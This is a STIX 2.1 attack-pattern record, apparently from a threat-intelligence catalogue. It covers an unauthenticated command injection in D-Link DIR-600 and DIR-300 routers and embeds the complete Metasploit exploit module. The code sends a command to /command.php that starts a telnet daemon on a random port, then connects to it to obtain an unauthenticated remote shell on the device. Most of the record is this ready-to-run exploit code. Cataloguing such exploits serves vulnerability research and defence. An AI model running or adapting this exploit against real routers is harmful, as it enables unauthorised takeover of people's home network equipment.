{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9a1dd03d-5832-43a4-84d2-0eb51b6bc919",
    "created": "2024-08-14T17:00:52.715996Z",
    "modified": "2024-08-14T17:00:52.716001Z",
    "name": "D-Link Devices Unauthenticated Remote Command Execution",
    "description": " Various D-Link Routers are vulnerable to OS command injection via the web interface. The vulnerability exists in command.php, which is accessible without authentication. This module has been tested with the versions DIR-600 2.14b01 DIR-300 rev B 2.13. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_command_php_exec_noauth.rb",
            "external_id": "dlink_command_php_exec_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/home-network-horror-days"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-003"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link Devices Unauthenticated Remote Command Execution',\n      'Description' => %q{\n        Various D-Link Routers are vulnerable to OS command injection via the web\n        interface. The vulnerability exists in command.php, which is accessible without\n        authentication. This module has been tested with the versions DIR-600 2.14b01,\n        DIR-300 rev B 2.13.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'OSVDB', '89861' ],\n          [ 'EDB', '24453' ],\n          [ 'BID', '57734' ],\n          [ 'URL', 'http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router' ],\n          [ 'URL', 'http://www.s3cur1ty.de/home-network-horror-days' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-003' ]\n        ],\n      'DisclosureDate' => '2013-02-04',\n      'Privileged'     => true,\n      'Platform'       => 'unix',\n      'Arch'        => ARCH_CMD,\n      'Payload'     =>\n        {\n          'Compat'  => {\n            'PayloadType'    => 'cmd_interact',\n            'ConnectionType' => 'find',\n          },\n        },\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'Targets'        =>\n        [\n          [ 'Automatic',\t{ } ]\n        ],\n      'DefaultTarget'  => 0\n      ))\n\n    register_advanced_options(\n      [\n        OptInt.new('TelnetTimeout', [ true, 'The number of seconds to wait for a reply from a Telnet command', 10]),\n        OptInt.new('TelnetBannerTimeout', [ true, 'The number of seconds to wait for the initial banner', 25]),\n        OptInt.new('SessionTimeout', [ true, 'The number of seconds to wait before building the session on the telnet connection', 10])\n      ])\n\n  end\n\n  def tel_timeout\n    (datastore['TelnetTimeout'] || 10).to_i\n  end\n\n  def banner_timeout\n    (datastore['TelnetBannerTimeout'] || 25).to_i\n  end\n\n  def session_timeout\n    (datastore['SessionTimeout'] || 10).to_i\n  end\n\n  def exploit\n    telnetport = rand(32767) + 32768\n\n    print_status(\"#{rhost}:#{rport} - Telnet port used: #{telnetport}\")\n\n    cmd = \"telnetd -p #{telnetport}\"\n\n    #starting the telnetd gives no response\n    print_status(\"#{rhost}:#{rport} - Sending exploit request...\")\n    request(cmd)\n\n    print_status(\"#{rhost}:#{rport} - Trying to establish a telnet connection...\")\n    ctx = { 'Msf' => framework, 'MsfExploit' => self }\n    sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnetport.to_i, 'Context' => ctx })\n\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Backdoor service has not been spawned!!!\")\n    end\n\n    add_socket(sock)\n\n    print_status(\"#{rhost}:#{rport} - Trying to establish a telnet session...\")\n    prompt = negotiate_telnet(sock)\n    if prompt.nil?\n      sock.close\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to establish a telnet session\")\n    else\n      print_good(\"#{rhost}:#{rport} - Telnet session successfully established... trying to connect\")\n    end\n\n    print_status(\"#{rhost}:#{rport} - Trying to create the Msf session...\")\n    begin\n      Timeout.timeout(session_timeout) do\n        activated = handler(sock)\n        while(activated !~ /claimed/)\n          activated = handler(sock)\n        end\n      end\n    rescue ::Timeout::Error\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to establish a Msf session\")\n    end\n  end\n\n  def request(cmd)\n\n    uri = '/command.php'\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        'vars_post' => {\n          \"cmd\" => cmd\n          }\n      })\n    return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Could not connect to the webservice\")\n    end\n  end\n\n  def negotiate_telnet(sock)\n    begin\n      Timeout.timeout(banner_timeout) do\n        while(true)\n          data = sock.get_once(-1, tel_timeout)\n          return nil if not data or data.length == 0\n          if data =~ /\\x23\\x20$/\n            return true\n          end\n        end\n      end\n    rescue ::Timeout::Error\n      return nil\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}